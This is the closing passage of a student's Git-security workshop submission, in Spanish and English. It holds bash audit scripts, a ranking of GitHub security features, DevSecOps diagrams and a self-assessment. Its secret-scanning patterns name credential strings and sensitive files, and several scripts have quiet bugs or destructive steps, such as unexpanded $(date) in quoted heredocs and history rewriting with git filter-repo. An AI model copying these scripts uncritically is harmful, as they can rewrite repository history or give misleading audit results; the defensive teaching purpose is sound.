echo "[4/5] Generating commit statistics..."
git log --all --oneline | wc -l > "$AUDIT_DIR/total-commits.txt"
git log --since="90 days ago" --oneline | wc -l >> "$AUDIT_DIR/recent-commits-90days.txt"

# 5. Listar cambios recientes por criticidad (basado en paths)
echo "[5/5] Identifying sensitive file changes..."
git log --all --name-only --pretty=format:"" | sort | uniq | \
  grep -E "(\.env|\.key|config|secret|password|credentials)" > "$AUDIT_DIR/sensitive-files.txt"

echo "✅ Preparation complete: $AUDIT_DIR"
```

---

**FASE 2: Escaneo de Secretos (1-2 horas)**

```bash
#!/bin/bash
# Archivo: security-audit-secrets.sh

echo "🔐 GIT SECURITY AUDIT - SECRET SCANNING PHASE"
echo "=============================================="

AUDIT_DIR="security-audits/$(date +%Y-%m-%d)"

# 1. Scan with detect-secrets
echo "[1/4] Running detect-secrets..."
detect-secrets scan --all-files > "$AUDIT_DIR/detect-secrets-results.json"
detect-secrets audit "$AUDIT_DIR/detect-secrets-results.json" > "$AUDIT_DIR/detect-secrets-audit.txt"

# 2. Scan with truffleHog
echo "[2/4] Running truffleHog..."
trufflehog git . --json > "$AUDIT_DIR/truffleHog-results.json"
# Analyze results
jq '.[] | select(.verified==true)' "$AUDIT_DIR/truffleHog-results.json" > "$AUDIT_DIR/truffleHog-verified-secrets.json"

# 3. Scan for known patterns
echo "[3/4] Scanning for forbidden patterns..."
PATTERNS=(
    'password\s*[=:]'
    'api[_-]?key\s*[=:]'
    'AWS_SECRET_ACCESS_KEY'
    'github_token'
    'PRIVATE[_-]KEY'
)

for pattern in "${PATTERNS[@]}"; do
    echo "Pattern: $pattern"
    git log -p --all -S "$pattern" --format="%H %aI %an" > "$AUDIT_DIR/pattern-$pattern.txt"
done

# 4. Large file scan
echo "[4/4] Scanning for large files..."
git rev-list --objects --all | \
  git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | \
  sed -n 's/^blob //p' | \
  sort --numeric-sort --key=2 | \
  tail -n 20 > "$AUDIT_DIR/large-files.txt"

echo "✅ Secret scanning complete"
```

**Análisis de Resultados**:

```bash
# Revisar archivos generados
Verdict=$(cat "$AUDIT_DIR/detect-secrets-audit.txt")
if grep -q "True Positive" "$AUDIT_DIR/detect-secrets-audit.txt"; then
    echo "🚨 ENCONTRADOS SECRETOS REALES"
    echo "Acción: Remediación inmediata requerida"
else
    echo "✅ No secrets found (or only false positives)"
fi
```

---

**FASE 3: Análisis de Control de Acceso (30-60 min)**

```bash
#!/bin/bash
# Archivo: security-audit-access.sh

echo "🔐 GIT SECURITY AUDIT - ACCESS CONTROL PHASE"
echo "============================================"

AUDIT_DIR="security-audits/$(date +%Y-%m-%d)"

# 1. Branch protection review
echo "[1/4] Reviewing branch protections..."
cat > "$AUDIT_DIR/branch-protection-review.txt" << 'EOF'
BRANCH PROTECTION CHECKLIST:
[ ] main:
    [ ] Require PR before merge
    [ ] Require approvals: N >= 1
    [ ] Dismiss stale reviews
    [ ] Require CODEOWNERS review
    [ ] Require status checks: tests, linting
    [ ] Require signed commits
    [ ] Include administrators

[ ] develop:
    [ ] Require PR before merge
    [ ] Require approvals: N >= 1
    [ ] Require status checks

[ ] release/*:
    [ ] Require PR before merge
    [ ] Require status checks
EOF

# 2. Contributors access
echo "[2/4] Reviewing collaborator access..."
gh repo view --json collaborators --jq '.collaborators[] | "\(.name) (\(.role))"' | \
  sort > "$AUDIT_DIR/collaborators-access.txt"

# Identify over-privileged accounts
echo "⚠️  Over-privileged accounts (MAINTAIN, ADMIN, OWNER):"
gh repo view --json collaborators --jq '.collaborators[] | select(.role | test("ADMIN|OWNER|MAINTAIN")) | .name' > "$AUDIT_DIR/over-privileged.txt"

#3. SSH keys review
echo "[3/4] Reviewing SSH/GPG keys..."
gh repo view --json deployKeys --jq '.deployKeys[] | "\(.title): \(.readOnly)"' > "$AUDIT_DIR/deploy-keys.txt"

# 4. Audit log review (GitHub)
echo "[4/4] Reviewing audit log (last 30 days)..."
gh api orgs/[org]/audit-log?per_page=100 --jq '.audit_log[] | select(.action=="repo.push" or .action=="repo_secret.create") | "\(.created_at) \(.action) \(.actor)"' > "$AUDIT_DIR/audit-log-sensitive.txt"
```

---

**FASE 4: Historio y Integridad de Commits (1 hora)**

```bash
#!/bin/bash
# Archivo: security-audit-commits.sh

echo "🔐 GIT SECURITY AUDIT - COMMIT INTEGRITY PHASE"
echo "=============================================="

AUDIT_DIR="security-audits/$(date +%Y-%m-%d)"

# 1. Signed commits verification
echo "[1/5] Verifying signed commits..."
git log --all --show-signature | grep -E "^commit|Good signature|Bad signature" > "$AUDIT_DIR/signed-commits.txt"

# Count unsigned commits
UNSIGNED=$(git log --all --oneline | wc -l)
SIGNED=$(grep -c "Good signature" "$AUDIT_DIR/signed-commits.txt")
echo "Unsigned commits: $((UNSIGNED - SIGNED)) / $UNSIGNED" >> "$AUDIT_DIR/stats.txt"

# 2. Commit message quality
echo "[2/5] Analyzing commit message quality..."
git log --all --pretty=format:"%s" | while read msg; do
    if [[ $msg != *": "* ]]; then  # Expected: "type: description"
        echo "Bad format: $msg" >> "$AUDIT_DIR/bad-commit-messages.txt"
    fi
done

# 3. Force-push detection
echo "[3/5] Looking for force-push history..."
git reflog --all | grep "checkout\|reset" > "$AUDIT_DIR/reflog-unusual-activity.txt"

# 4. Suspicious commit patterns
echo "[4/5] Scanning for suspicious commit patterns..."
git log --all -p | grep -E "DELETE FROM|DROP TABLE|TRUNCATE|runtime.exec" > "$AUDIT_DIR/suspicious-patterns.txt"

# 5. Author verification
echo "[5/5] Verifying commit authors..."
git log --all --format="%aN <%aE>" | sort | uniq > "$AUDIT_DIR/commit-authors.txt"
# Cross-check with CODEOWNERS file
grep -v "^#" CODEOWNERS | awk '{print $NF}' > "$AUDIT_DIR/codeowners-expected.txt"
```

---

**FASE 5: Análisis de Dependencias (
30-45 min)**

```bash
#!/bin/bash
# Archivo: security-audit-dependencies.sh

echo "🔐 GIT SECURITY AUDIT - DEPENDENCY CHECK PHASE"
echo "=============================================="

AUDIT_DIR="security-audits/$(date +%Y-%m-%d)"

# 1. NPM audit
echo "[1/4] Running npm audit..."
if [ -f package.json ]; then
    npm audit --audit-level=high > "$AUDIT_DIR/npm-audit.txt" 2>&1
    npm audit --json > "$AUDIT_DIR/npm-audit.json"
fi

# 2. Python dependencies
echo "[2/4] Checking Python dependencies..."
if [ -f requirements.txt ]; then
    pip check > "$AUDIT_DIR/pip-check.txt" 2>&1
    # or use safety package
    safety check > "$AUDIT_DIR/safety-check.txt" 2>&1
fi

# 3. Docker images
echo "[3/4] Scanning Docker images..."
if [ -f Dockerfile ]; then
    grep "^FROM" Dockerfile | while read line; do
        image=$(echo $line | awk '{print $2}')
        echo "Scanning: $image"
        # Trivy scan if available
        trivy image --severity HIGH,CRITICAL "$image" >> "$AUDIT_DIR/docker-scan.txt"
    done
fi

# 4. SBOM (Software Bill of Materials)
echo "[4/4] Generating SBOM..."
if [ -f package.json ]; then
    npm ls --json > "$AUDIT_DIR/npm-sbom.json"
fi
```

---

**FASE 6: Reportes y Recomendaciones (1-2 horas)**

```bash
#!/bin/bash
# Archivo: security-audit-report.sh

echo "🔐 GIT SECURITY AUDIT - FINAL REPORT"
echo "===================================="

AUDIT_DIR="security-audits/$(date +%Y-%m-%d)"

# Crear reporte ejecutivo
cat > "$AUDIT_DIR/SECURITY_AUDIT_REPORT.md" << 'EOF'
# Security Audit Report
**Audit Date:** $(date)
**Repository:** [repo name]
**Status:** [PASSED / FAILED / WARNINGS]

## Executive Summary

### Scores
- Secret Detection: [0-100]
- Access Control: [0-100]
- Commit Integrity: [0-100]
- Dependencies: [0-100]
- **Overall Score:** [0-100]

### Critical Findings
1. [If any]

### High Priority Findings
1. [If any]

## Detailed Findings

### 1. Secrets & Credentials
- Detected: [X] secrets (Y verified, Z false positives)
- Status: ✓ PASS / 🚨 FAIL

### 2. Access Control
- Branches Protected: X/Y
- Collaborators: Z
- Over-privileged: A
- Status: ✓ PASS / 🚨 FAIL

### 3. Commit Integrity
- Signed Commits: X%
- Force Pushes Detected: Y
- Suspicious Commits: Z
- Status: ✓ PASS / ⚠️  WARNING

### 4. Dependencies
- Vulnerabilities Found: X (Critical: Y, High: Z)
- Outdated Packages: A
- Status: ✓ PASS / 🚨 FAIL

## Recommendations (Prioritized)

### IMMEDIATE (Next 24 hours)
- [ ] Remediación de secretos si fueron encontrados

### SHORT TERM (Next 1-2 weeks)
- [ ] Enable secret scanning + push protection
- [ ] Fix vulnerable dependencies
- [ ] Review and strengthen branch protection rules

### MEDIUM TERM (Next 1-2 months)
- [ ] Implementar signed commits requirement
- [ ] Audit y actualizar access control
- [ ] Implementar automated compliance checking

### LONG TERM (Roadmap)
- [ ] Advanced security features (GitHub Advanced Security)
- [ ] Automated supply chain scanning
- [ ] Security training for team

EOF

# Generar resumen json para parseo
cat > "$AUDIT_DIR/audit-summary.json" << 'EOF'
{
  "audit_date": "$(date)",
  "repository": "[repo]",
  "overall_score": 0,
  "findings": {
    "secrets": {"detected": 0, "verified": 0},
    "access_control": {"issues": 0},
    "commits": {"unsigned": 0},
    "dependencies": {"vulnerabilities": 0}
  },
  "status": "PENDING_REVIEW"
}
EOF

echo "✅ Audit report generated: $AUDIT_DIR/SECURITY_AUDIT_REPORT.md"
```

---

**FASE 7: Plan de Remediación (según hallazgos)**

```bash
# Ejemplo: Remediación de secreto encontrado

if grep -q "True Positive" "$AUDIT_DIR/detect-secrets-audit.txt"; then
    echo "🚨 SECRET FOUND - STARTING REMEDIATION"

    # 1. Identificar el secreto
    SECRET_FILE=$(grep -oP 'File: \K.*' "$AUDIT_DIR/detect-secrets-audit.txt")
    SECRET_TYPE=$(grep -oP 'Type: \K.*' "$AUDIT_DIR/detect-secrets-audit.txt")

    #2. Crear rama de remediación
    git checkout -b security/remediate-exposed-secret

    # 3. Usar git filter-repo para limpiar
    git filter-repo --replace-text <(echo "exposed_value==>REDACTED")

    # 4. Rotar credencial
    # (aplicación específica)

    # 5. Push y crear PR
    git push origin security/remediate-exposed-secret
    gh pr create --title "🔒 Security: Remediate exposed secret" --body "Closes #XXX"

    # 6. Documentar incidente
    cat > INCIDENT_REPORT.md << 'REPORT'
    # Incident: Exposed Secret
    ...
    REPORT
fi
```

---

**Checklist Completo de Audit**:

```yaml
GIT SECURITY AUDIT CHECKLIST:

PHASE 1 - PREPARATION ✓/✗
  ✓/✗ Repository metadata collected
  ✓/✗ Branch structure documented
  ✓/✗ Collaborators listed
  ✓/✗ Audit scope defined

PHASE 2 - SECRETS ✓/✗
  ✓/✗ detect-secrets scan run
  ✓/✗ truffleHog scan run
  ✓/✗ Pattern scanning completed
  ✓/✗ Large files checked
  ✓/✗ No verified secrets found

PHASE 3 - ACCESS CONTROL ✓/✗
  ✓/✗ Branch protections reviewed
  ✓/✗ Collaborator access verified
  ✓/✗ Deploy keys audited
  ✓/✗ Over-privileged accounts identified
  ✓/✗ Audit log reviewed

PHASE 4 - COMMIT INTEGRITY ✓/✗
  ✓/✗ Signed commits verified
  ✓/✗ Force-push history checked
  ✓/✗ Suspicious patterns scanned
  ✓/✗ Authors verified

PHASE 5 - DEPENDENCIES ✓/✗
  ✓/✗ npm audit passed
  ✓/✗ Python dependencies checked
  ✓/✗ Docker images scanned
  ✓/✗ SBOM generated

PHASE 6 - REPORTING ✓/✗
  ✓/✗ Final report generated
  ✓/✗ Findings documented
  ✓/✗ Remediations recommended
  ✓/✗ Stakeholders notified

PHASE 7 - REMEDIATION ✓/✗
  ✓/✗ Critical issues resolved
  ✓/✗ High-priority issues scheduled
  ✓/✗ Plan documented
  ✓/✗ Follow-up audit scheduled
```

---

#### What GitHub security features are most important?

**Ranking de Características de Seguridad de GitHub (Por Criticidad)**

**🔴 TIER 1 - CRÍTICAS (MUST HAVE)**

**1. Branch Protection Rules**

```bash
# Implementación:
GitHub > Settings > Branches > Add rule for "main"

Configuración Mínima:
  ✓ Require a pull request before merging
  ✓ Require approvals: 1
  ✓ Dismiss stale pull request approvals: ON
  ✓ Require status checks to pass: ON
  ✓ Require branches to be up to date: ON
  ✓ Require commits to be signed: ON  # CRÍTICO

# Impacto:
- Previene direct pushes a main
- Fuerza revisión por pares
- Validación automática de tests
- Garantiza autenticidad de commits
```

**2. Secret Scanning & Push Protection**

```bash
# Implementación:
GitHub > Settings > Code security > Secret scanning
  ✓ Enable "Secret scanning for push"
  ✓ Enable "Push protection for users"

# Qué previene:
- Secretos no llegan al repositorio
- AWS keys, GitHub tokens, Stripe keys detectados automáticamente
- Push es bloqueado si contiene secreto

Alert:  ERROR: GH013 - Secret detected
        Remove secret before push
```

**3. Dependabot - Dependency Updates**

```bash
# Implementación:
  ✓ Enable "Version updates"
  ✓ Enable "Security updates"

# Qué hace:
- Monitorea vulnerabilidades en dependencies
- Auto-crea PRs para actualizar versiones
- Prioriza security updates
- Solicita merge automático para patches críticos
```

---

**🟡 TIER 2 - IMPORTANTE (HIGHLY RECOMMENDED)**

**4. Code Owners & CODEOWNERS File**

```bash
# Archivo: CODEOWNERS
/docs      @fernando
/src/auth  @security-team
/src/api   @api-team
*          @core-team

# Efectos:
- Requerimiento automático de aprobación
- Asignación automática en PRs
- Distribución de responsabilidad de revisión
```

**5.Advanced Security - SAST-Style Scanning**

```bash
GitHub > Settings > Code security > Code scanning
  ✓ Enable CodeQL
  ✓ Configure SARIF upload

# Qué detecta:
- SQL injection vulnerabilities
- Cross-site scripting (XSS)
- Command injection
- Unsafe deserialization
- And 50+ other patterns
```

**6. Audit Logs (Organization Level)**

```bash
GitHub > Organization > Settings > Audit log

Registra:
- Quién hizo qué cambio
- Cuándo fue hecho
- Desde qué IP
- Resultado (éxito/fallo)

# Exportar para análisis:
gh api orgs/[org]/audit-log --paginate | jq . > audit-export.json
```

---

**🟢 TIER 3 - ÚTIL (NICE TO HAVE)**

**7. Collaborators Management**

```bash
GitHub > Settings > Access > Collaborators

Roles:
  - Pull: read-only (fork and pull)
  - Triage: label, milestone pero no commit
  - Write: pull requests y commits (desarrolladores)
  - Maintain: branch protection pero no delete
  - Admin: full access

# Best practice:
- Junior devs: Triage
- Team devs: Write
- Leads: Maintain
- CTO: Admin (1-2 only)
```

**8. Environments & Deployment Protection Rules**

```bash
GitHub > Settings > Environments > [production]

Configurar:
  ✓ Require reviewers: YES
  ✓ Restrict admins
  ✓ Deployment branches: only main, release/*

# Efecto:
- Deployment a prod requiere aprobación manual
- Previene accidental prod deployments
```

**9. Security Vulnerability Reporting**

```bash
GitHub > Settings > Code security > Reporting

Habilitar:
  ✓ Security advisories
  ✓ Private vulnerability reporting

# Permite:
- Reportar vulnerabilidades privadamente
- Investigar antes de público  disclosure
- CVE asignado si aplica
```

---

**10. Repository Ruleset (Newer, Powerful)**

```bash
GitHub > Settings > Rules (Beta)

Define reglas tipo:
  - Require signed commits
  - Require status to pass
  - Require pull request reviews
  - Restrict commit message patterns
  - Restrict file types

# Ventaja sobre branch protection:
- Se aplica a múltiples branches simultáneamente
- Más granular y flexible
- Pattern matching avanzado
```

---

**11. Webhook & Event Streaming**

```bash
GitHub > Settings > Webhooks

Configure webhooks para:
  - Push events → SIEM (ingestion)
  - PR events → Slack notifications
  - Release events → Deployment pipeline
  - Issue events → Ticketing system

# Security use case:
- Push to main → Alert security team
- New collab added → Compliance audit
- Secret scanning alert → Incident response
```

---

**Priorización Recomendada por Etapa**:

```
FOUNDATIONAL (Mes 1):
✓ Branch protection (main)
✓ Secret scanning + push protection
✓ Signed commit requirement
✓ CODEOWNERS

INTERMEDIATE (Mes 2-3):
✓ Dependabot
✓ SAST (CodeQL)
✓ Audit logs export
✓ Environments

ADVANCED (Mes 4+):
✓ Custom rules
✓ Webhooks integration
✓ SAML/SSO (if enterprise)
✓ Advanced Security premium features
```

---

#### How does Git security fit into DevSecOps?

**Relación: Git Security ↔ DevSecOps**

**¿Qué es DevSecOps?**

```
Traditional Security:
┌─ Desarrollo ─→ Seguridad Review ─→ Testing ─→ Deployment ┐
│                    (bottleneck)                            │
└────────────────────────────────────────────────────────────┘
Problem: Security es puerta después de desarrollo, retraso

DevSecOps:
┌─ Desarrollo ─→ ┌─ Seguridad Automatizada ─┐ ─→ Deployment ┐
│         (integrada en cada paso)           │               │
│                                      ┌─────┴──────┐        │
│                              Testing │   SAST     │        │
│                              (tests) │   DAST     │        │
└──────────────────────────────────────┴────────────┴────────┘
Solution: Security checks en tiempo de desarrollo
```

**Git Security es un Pilar Clave de DevSecOps**:

```
DevSecOps Pillars:
┌──────────────────────────────────────────────┐
│                                              │
├─ PLAN                                        │
│  └─ Threat modeling                          │
│  └─ Security requirements definition         │
│                                              │
├─ CODE (← GIT SECURITY HERE)                  │
│  ├─ Pre-commit hooks                         │
│  ├─ Secret scanning                          │
│  ├─ Code review enforcement                  │
│  ├─ Signed commits                           │
│  ├─ SAST scanning                            │
│  └─ Dependency auditing                      │
│                                              │
├─ BUILD                                       │
│  ├─ Container image scanning                 │
│  ├─ Build log analysis                       │
│  └─ Artifact signing                         │
│                                              │
├─ TEST                                        │
│  ├─ DAST (Dynamic testing)                   │
│  ├─ Pen testing                              │
│  └─ Security test cases                      │
│                                              │
├─ DEPLOY                                      │
│  ├─ Infrastructure as Code scanning          │
│  ├─ Deployment approval gates                │
│  └─ Runtime security monitoring              │
│                                              │
└─ MONITOR & RESPOND                           │
   ├─ Runtime anomaly detection                │
   ├─ Security logging                         │
   └─ Incident response                        │
```

**Cómo Git Security Habilita DevSecOps**:

```
1. SHIFT LEFT: Detectar problemas TEMPRANO

   Traditional:
   Code → Build → Test → Deploy → Production
   (bug+security issue found in prod 🚨)

   DevSecOps with Git:
   Code ← Security checks here ✓
   → Build ← Dependency scanning
   → Test ← DAST
   → Deploy (mostly safe)
   → Production (minimal surprises)

2. AUTOMATION: Menos manual review, más automatizado

   git push origin feature/payment
       ↓
   Ejecuta automáticamente:
         - Secret scanning
         - SAST (code analysis)
         - Dependency audit
         - Signed commit check
         - Status checks (tests)
   ↓
   PR requiere 1 aprobación + todos los checks ✓
   ↓
   Merge a main
   ↓
   CD automático deploys

3. ACCOUNTABILITY: Quién hizo qué cambio

   git log --show-signature --format="%h %aI %an %s"
   → Firma GPG verifica QUIÉN
   → Timestamp verifica CUÁNDO
   → Audit logs verifica DESDE DÓNDE

4. COMPLIANCE READY: Auditoría para regulaciones

   "Demostrar que todo código fue revisado"
   → Branch protection rules (PR required)

   "Demostrar que código es de autores autorizados"
   → Signed commits (GPG)

   "Demostrar historio completo de cambios"
   → Git reflog + GitHub audit logs
```

---

**Arquitectura Completa: Git en DevSecOps Pipeline**

```
┌─────────────────────────────────────────────────────────────┐
│  DEVELOPER'S MACHINE                                        │
├─────────────────────────────────────────────────────────────┤
│  1. Escribe código                                          │
│     $ code feature.py                                       │
│                                                             │
│  2. Pre-commit hook ejecuta                                 │
│     - detect-secrets scan                                   │
│     - linting                                               │
│     - unit tests                                            │
│     if [ FAIL ] → git push bloqueado                        │
│                                                             │
│  3. Commit con firma GPG                                    │
│     $ git commit -S -m "feat: Add payment"                  │
│  (si no está firmado + branch protección requiere firma)    │
│  → commit.gpgsign = true en ~/.git/config                   │
│                                                             │
│  4. Push a rama de feature                                  │
│     $ git push origin feature/payment                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│  GITHUB REPOSITORY                                          │
├─────────────────────────────────────────────────────────────┤
│  5. Servidor recibe push                                    │
│                                                             │
│  6. GitHub Actions dispara (webhook)                        │
│     Ejecuta matriz de checks:                              │
│     ├─ Secret scanning (GH native)                         │
│     │  └─ detect-secrets, truffleHog                       │
│     ├─ SAST CodeQL (code structure analysis)               │
│     ├─ Linting & formatting                                │
│     ├─ Unit tests (npm test)                               │
│     ├─ Integration tests                                   │
│     ├─ Dependency audit                                    │
│     │  └─ npm audit, Dependabot                            │
│     └─ Container scan (if Docker build)                    │
│                                                             │
│  7. All checks deben ser VERDE antes de PR merge            │
│                                                             │
│  8. Developer crea PR                                       │
│     Title: "feat: Add payment processing"                   │
│     Description: Explica cambios                            │
│                                                             │
│  9. Branch protection requiere:                             │
│     ✓ 1+ approvals (code owner review)                      │
│     ✓ All status checks green                              │
│     ✓ Conversaciones resolved                              │
│     ✓ Commits signed                                        │
│                                                             │
│  10. Code owner reviewa                                     │
│      Checa: lógica, seguridad, coverage                     │
│      Aprueba → Merge button enabled                         │
│                                                             │
│  11. Merge a main                                           │
│      (con squash o rebase según política)                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│  CI/CD PIPELINE (GitHub Actions, Jenkins, etc.)            │
├─────────────────────────────────────────────────────────────┤
│  12. Merge a main dispara RELEASE pipeline:                │
│                                                             │
│      ├─ Build stage:                                        │
│      │  ├─ Build app binary/Docker image                   │
│      │  ├─ SBOM generation (software bill of materials)    │
│      │  └─ Artifact signing                                │
│      │                                                     │
│      ├─ Security scanning stage:                           │
│      │  ├─ DAST (dynamic security testing)                 │
│      │  ├─ Container image scan (Trivy)                    │
│      │  ├─ IaC scan (Terraform, CloudFormation)            │
│      │  └─ Dependency scan (full tree)                     │
│      │                                                     │
│      ├─ Compliance stage:                                  │
│      │  ├─ License audit                                   │
│      │  ├─ Best practices check                            │
│      │  └─ Security baseline verification                  │
│      │                                                     │
│      └─ If all pass → Deployment approval gate             │
│         (require human approval?)                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│  STAGING/PRODUCTION                                         │
├─────────────────────────────────────────────────────────────┤
│  13. Deploy to staging first (canary/shadow traffic)        │
│                                                             │
│  14. Runtime security monitoring:                           │
│      ├─ Container runtime monitoring                        │
│      ├─ Network traffic monitoring                          │
│      ├─ Log aggregation & analysis                          │
│      └─ Anomaly detection (unusual behavior)                │
│                                                             │
│  15. Gradual rollout to production:                         │
│      ├─ 5% traffic → 25% → 50% → 100%                      │
│      ├─ Health checks pass?                                │
│      └─ If issues → Automatic rollback                     │
│                                                             │
│  16. Security monitoring ongoing:                           │
│      ├─ Intrusion detection                                │
│      ├─ Resource anomalies                                 │
│      └─ Threat hunting                                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│  FEEDBACK LOOP                                              │
├─────────────────────────────────────────────────────────────┤
│  17. If security issue found:                              │
│      ├─ Alert raised automatically                         │
│      ├─ Issue created in GitHub                            │
│      ├─ Incident response triggered                        │
│      └─ Post-mortem scheduled                              │
│                                                             │
│  18. Findings fed back to:                                 │
│      ├─ Code scanning rules (new patterns to detect)        │
│      ├─ Branch protection (stricter rules if needed)       │
│      └─ Team training (if human error)                     │
│                                                             │
│  19. Security metrics tracked:                              │
│      ├─ Time-to-remediate vulnerabilities                  │
│      ├─ Number of security findings                        │
│      ├─ False positive rate                                │
│      └─ Security coverage %                                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

**Integración Específica: Git en Cada Fase**

| Fase    | Git Security Component | Tool                | Acción                                    |
| ------- | ---------------------- | ------------------- | ----------------------------------------- |
| PLAN    |                        |                     | Threat model define security requirements |
| CODE    | Pre-commit hooks       | detect-secrets      | ✓ Bloquea secretos locales                |
| CODE    | SAST                   | CodeQL              | ✓ Escanea inyecciones SQL, XSS            |
| CODE    | Branch protection      | GitHub              | ✓ Requiere PR + aprobación                |
| CODE    | Signed commits         | GPG                 | ✓ Verifica autenticidad                   |
| CODE    | CODEOWNERS             | GitHub              | ✓ Asigna revisores por owner              |
| BUILD   | SBOM generation        | •                   | ✓ Lista todas las dependencias            |
| BUILD   | Container scan         | Trivy               | ✓ Escanea image por vulnerabilidades      |
| TEST    | Dependency audit       | npm audit           | ✓ Agora vulnerabilidades conocidas        |
| TEST    | DAST                   | OWASP ZAP           | ✓ Testing funcional de seguridad          |
| DEPLOY  | IaC scanning           | Checkov             | ✓ Valida Terraform/CloudFormation         |
| DEPLOY  | Approval gates         | GitHub Environments | ✓ Aprobación manual requerida             |
| MONITOR | Runtime monitoring     | Falco               | ✓ Detecta comportamientos sospechosos     |
| MONITOR | Audit logs export      | GitHub API          | ✓ Envía a SIEM para análisis              |
| RESPOND | Incident response      | GitHub Issues       | ✓ Automáticamente crea issue y asigna     |

---

**Automación de Git Security en DevSecOps**:

```yaml
# Ejemplo: GitHub Actions Workflow
name: DevSecOps Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      # 1. Code checkout
      - uses: actions/checkout@v3
        with:
          fetch-depth: 0

      # 2. Secret scanning
      - name: Scan for secrets
        run: |
          pip install detect-secrets
          detect-secrets scan --all-files || exit 1

      # 3. SAST
      - name: Run CodeQL
        uses: github/codeql-action/init@v2
        with:
          languages: python

      - name: Build for analysis
        run: make build

      - name: Perform CodeQL analysis
        uses: github/codeql-action/analyze@v2

      # 4. Dependency audit
      - name: Audit dependencies
        run: |
          npm audit --audit-level=high  # Fail on high/crit

      # 5. Lint & format
      - name: Lint code
        run: npm run lint

      # 6. Tests
      - name: Run tests
        run: npm test -- --coverage

      # 7. Coverage report
      - name: Upload coverage
        uses: codecov/codecov-action@v3

      # 8. SBOM generation
      - name: Generate SBOM
        run: |
          npm ls --json > sbom.json

      # 9. Comment on PR with results
      - name: Comment results
        if: github.event_name == 'pull_request'
        uses: actions/github-script@v6
        with:
          script: |
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: '✅ All security checks passed'
            })
```

---

**Retorno en Inversión (ROI) de Git Security en DevSecOps**:

```
Antes (sin Git security integrada):
┌──────────────────────────────────────┐
│ Tiempo a producción: 2 semanas        │
│ Encontrados en prod: 5+ vulns/quarter │
│ MTTR (Mean Time To Remediate): 3 days │
│ Cumplimiento: Manual, tedioso         │
│ Costo: Manual reviews, firefighting   │
└──────────────────────────────────────┘

Después (con Git security + DevSecOps):
┌──────────────────────────────────────┐
│ Tiempo a producción: 3-5 días (FASTER)│
│ Encontrados en prod: < 1 vulns/quarter│
│ MTTR: < 6 horas                       │
│ Cumplimiento: Automatizado            │
│ Costo: Automatización previene issues │
└──────────────────────────────────────┘

Resultado: "Security doesn't slow us down, it speeds us up"
```

---

---

## 📊 Self-Assessment

Rate your confidence level for each topic (1-5, where 5 is very confident):

| Topic               | Confidence (1-5) | Notes                                                                      |
| ------------------- | ---------------- | -------------------------------------------------------------------------- |
| Basic Git commands  | [4]              | Poco a poco más fluido y dejando de depender de la GUI para tareas comunes |
| Branching & merging | [5]              |                                                                            |
| Remote operations   | [5]              |                                                                            |
| Conflict resolution | [5]              |                                                                            |
| History rewriting   | [4]              |                                                                            |
| Git hooks           | [1]              |                                                                            |
| Security practices  | [3]              |                                                                            |

---

## 🔗 Evidence/Artifacts

**Links to branches/commits**:

- Link to your outcome branch: `https://github.com/FerniCuesta/taller-master-ugr/tree/group-X-outcomes/master-of-the-universe`

---

## ✅ Completion Checklist

Before submitting, ensure you have:

- [x] Completed the exercise for your chosen level (including all parts)
- [x] Documented all commands used with their outputs
- [x] Described challenges and how you resolved them
- [x] Provided a thoughtful reflection on your learning
- [x] Self-assessed your confidence in each topic
- [x] Pushed your outcome branch to the remote repository
- [ ] Created a Pull Request (if required by your instructor)

---

**Submission Date**: 14/02/2026
**Ready for Review**: ✅ Yes
